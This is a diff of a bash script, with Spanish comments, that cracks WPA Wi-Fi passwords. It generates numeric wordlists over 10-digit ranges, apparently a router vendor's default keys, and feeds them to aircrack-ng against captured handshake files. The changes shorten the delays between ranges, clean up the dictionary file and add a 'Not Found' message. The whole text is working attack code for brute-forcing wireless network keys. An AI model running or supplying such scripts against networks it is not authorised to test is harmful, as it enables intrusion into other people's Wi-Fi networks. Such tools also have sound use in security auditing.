@@ -25,27 +25,33 @@ if [ $(cat key) != "0" ]
 seq -w 0043000000 0044400000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
 if [ $(cat key) != "0" ]
   then
+    rm dic
     exit 0
   fi
-sleep 10
+sleep 1
 #30millones a 44 millones, 10 digitos, 014
 seq -w 0143000000 0144400000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
 if [ $(cat key) != "0" ]
   then
+    rm dic
     exit 0
   fi
-sleep 10
+sleep 1
 #08millones a 20 millones, 10 digitos, 004
 seq -w 0040800000 0042000000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
 if [ $(cat key) != "0" ]
   then
+    rm dic
     exit 0
   fi
-sleep 10
+sleep 1
 #08millones a 20 millones, 10 digitos, 014
 seq -w 0140800000 0142000000 > dic; aircrack-ng -l key -e "$ESSID" -w dic caps/"$capFile".cap
 if [ $(cat key) != "0" ]
   then
+    rm dic
     exit 0
+  else
+    rm dic
+    echo "Not Found :/"
   fi
-rm dic
